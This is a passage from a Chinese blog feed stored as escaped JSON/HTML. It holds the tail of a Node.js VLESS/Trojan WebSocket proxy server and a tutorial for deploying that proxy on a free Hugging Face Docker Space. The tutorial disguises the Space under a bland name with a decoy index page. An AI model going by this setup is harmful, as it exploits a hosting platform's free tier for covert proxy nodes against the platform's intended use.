class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + 16\u003cspan class=\"o\"\u003e)\u003c/span\u003e.reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003es, b, i, a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003ei % \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? s.concat\u003cspan class=\"o\"\u003e(\u003c/span\u003ea.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei - 1, i + 1\u003cspan class=\"o\"\u003e))\u003c/span\u003e : s\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"o\"\u003e[])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .map\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; b.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e16\u003cspan class=\"o\"\u003e))\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 16\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0d \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset + 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eduplex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e createWebSocketStream\u003cspan class=\"o\"\u003e(\u003c/span\u003ews\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .then\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedIP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host: resolvedIP, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .catch\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eerror\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Ws 连接处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewss.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;connection\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003ews, req\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e req.url \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ws.once\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;message\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.length \u0026gt; \u003cspan class=\"m\"\u003e17\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e1, 17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eisVless\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e id.every\u003cspan class=\"o\"\u003e((\u003c/span\u003ev, i\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e parseInt\u003cspan class=\"o\"\u003e(\u003c/span\u003euuid.substr\u003cspan class=\"o\"\u003e(\u003c/span\u003ei * 2, 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e, 16\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eisVless\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!handleVlessConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          ws.close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!handleTrojanConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      ws.close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttpServer.listen\u003cspan class=\"o\"\u003e(\u003c/span\u003ePORT, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003escheme\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e tlsOptions ? \u003cspan class=\"s1\"\u003e\u0026#39;HTTPS/WSS\u0026#39;\u003c/span\u003e : \u003cspan class=\"s1\"\u003e\u0026#39;HTTP/WS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  console.log\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eServer is running on \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003escheme\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e port \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePORT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e原始文件长这样：\u003c/p\u003e","title":"薅羊毛之扣子编程"},{"content":"应佬友的要求再出一篇文章，前面薅了wispbyte.com的羊毛，但是吧容器比较弱小，强一点的就是huggingface.co的容器：\nFree版本就是2vCPU和16GB RAM，就已经非常强了\n那先介绍一下huggingface，其实这是一家非常强悍的公司，可以称作是“AI界的GitHub”，可以分享模型，数据集，然后演示应用。\n我们用到的就是这个演示应用（Spaces）\n首先注册好账号，然后右上角点击头像按钮，新建一个Space\n然后填入必须项\nSpace name：就写myhome Short description：Save Our Home License：MIT SDK：选择Docker Docker template: 选择Blank Space hardware：选择Free 其它都不选，最后CreateSpace即可\n然后就建好了，其实是给你开了一个git的repo\n我们到右上角，选择Files选项\n然后打开的文件页面，只有两个文件\n老套路，建立一个Dockerfile文件，就是容器的打包文件\nDockerfile的内容，编辑好，然后提交，注意：Linux有严格的大小写要求，务必遵守\nFROM nikolaik/python-nodejs:python3.14-nodejs22 WORKDIR /tmp COPY index.js /tmp/index.js COPY package.json /tmp/package.json COPY index.html /tmp/index.html CMD npm install \u0026amp;\u0026amp; node index.js 然后我们把index.js准备好，需要修改几个地方\nconst http = require(\u0026#39;http\u0026#39;); const https = require(\u0026#39;https\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); const net = require(\u0026#39;net\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const { Buffer } = require(\u0026#39;buffer\u0026#39;); const { WebSocket, createWebSocketStream } = require(\u0026#39;ws\u0026#39;); // 生成 UUID v4 function generateUUID() { return crypto.randomUUID(); } const UUID = process.env.UUID || generateUUID(); const DOMAIN = process.env.DOMAIN || \u0026#39;1234.abc.com\u0026#39;; // 填写项目域名 const WSPATH = process.env.WSPATH || UUID.slice(0, 8); // 节点路径，默认获取uuid前8位 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 获取节点的订阅路径 const NAME = process.env.NAME || \u0026#39;\u0026#39;; // 节点名称 const PORT = process.env.PORT || 7860; // http和ws服务端口 const TLS_KEY_PATH = process.env.TLS_KEY_PATH || \u0026#39;tls.key\u0026#39;; const TLS_CERT_PATH = process.env.TLS_CERT_PATH || \u0026#39;tls.crt\u0026#39;; let ISP = \u0026#39;\u0026#39;; const GetISP = async () =\u0026gt; { try { const res = await axios.get(\u0026#39;https://api.ip.sb/geoip\u0026#39;); const data = res.data; ISP = `${data.country_code}-${data.isp}`.replace(/ /g, \u0026#39;_\u0026#39;); } catch (e) { ISP = \u0026#39;Unknown\u0026#39;; } } GetISP(); function normalizeSecret(value) { if (!value) return \u0026#39;\u0026#39;; return value.includes(\u0026#39;\\\\n\u0026#39;) ? value.replace(/\\\\n/g, \u0026#39;\\n\u0026#39;) : value; } function readOptionalFile(filePath) { if (!filePath) return \u0026#39;\u0026#39;; const resolvedPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath); try { return fs.readFileSync(resolvedPath, \u0026#39;utf8\u0026#39;); } catch (error) { console.warn(`Failed to read TLS file ${resolvedPath}: ${error.message}`); return \u0026#39;\u0026#39;; } } function getTLSOptions() { let key = normalizeSecret(process.env.TLS_KEY); let cert = normalizeSecret(process.env.TLS_CERT); if (!key) { key = readOptionalFile(TLS_KEY_PATH); } if (!cert) { cert = readOptionalFile(TLS_CERT_PATH); } if (key \u0026amp;\u0026amp; cert) { return { key, cert }; } if (key || cert) { console.warn(\u0026#39;Both TLS key and certificate are required; falling back to HTTP.\u0026#39;); } return null; } const requestHandler = (req, res) =\u0026gt; { if (req.url === \u0026#39;/\u0026#39;) { const filePath = path.join(__dirname, \u0026#39;index.html\u0026#39;); fs.readFile(filePath, \u0026#39;utf8\u0026#39;, (err, content) =\u0026gt; { if (err) { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(\u0026#39;Hello world!\u0026#39;); return; } res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(content); }); return; } else if (req.url === `/${SUB_PATH}`) { const namePart = NAME ? `${NAME}-${ISP}` : ISP; const vlessURL = `vless://${UUID}@${DOMAIN}?encryption=none\u0026amp;security=tls\u0026amp;sni=${DOMAIN}:443\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}\u0026amp;path=%2F${WSPATH}#${namePart}`; const trojanURL = `trojan://${UUID}@${DOMAIN}?security=tls\u0026amp;sni=${DOMAIN}\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}:443\u0026amp;path=%2F${WSPATH}#${namePart}`; const subscription = vlessURL + \u0026#39;\\n\u0026#39; + trojanURL; const base64Content = Buffer.from(subscription).toString(\u0026#39;base64\u0026#39;); res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(base64Content + \u0026#39;\\n\u0026#39;); } else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;Not Found\\n\u0026#39;); } }; const tlsOptions = getTLSOptions(); const httpServer = tlsOptions ? https.createServer(tlsOptions, requestHandler) : http.createServer(requestHandler); const wss = new WebSocket.Server({ server: httpServer }); const uuid = UUID.replace(/-/g, \u0026#34;\u0026#34;); const DNS_SERVERS = [\u0026#39;8.8.4.4\u0026#39;, \u0026#39;1.1.1.1\u0026#39;]; // Custom DNS function resolveHost(host) { return new Promise((resolve, reject) =\u0026gt; { if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) { resolve(host); return; } let attempts = 0; function tryNextDNS() { if (attempts \u0026gt;= DNS_SERVERS.length) { reject(new Error(`Failed to resolve ${host} with all DNS servers`)); return; } const dnsServer = DNS_SERVERS[attempts]; attempts++; const dnsQuery = `https://dns.google/resolve?name=${encodeURIComponent(host)}\u0026amp;type=A`; axios.get(dnsQuery, { timeout: 5000, headers: { \u0026#39;Accept\u0026#39;: \u0026#39;application/dns-json\u0026#39; } }) .then(response =\u0026gt; { const data = response.data; if (data.Status === 0 \u0026amp;\u0026amp; data.Answer \u0026amp;\u0026amp; data.Answer.length \u0026gt; 0) { const ip = data.Answer.find(record =\u0026gt; record.type === 1); if (ip) { resolve(ip.data); return; } } tryNextDNS(); }) .catch(error =\u0026gt; { tryNextDNS(); }); } tryNextDNS(); 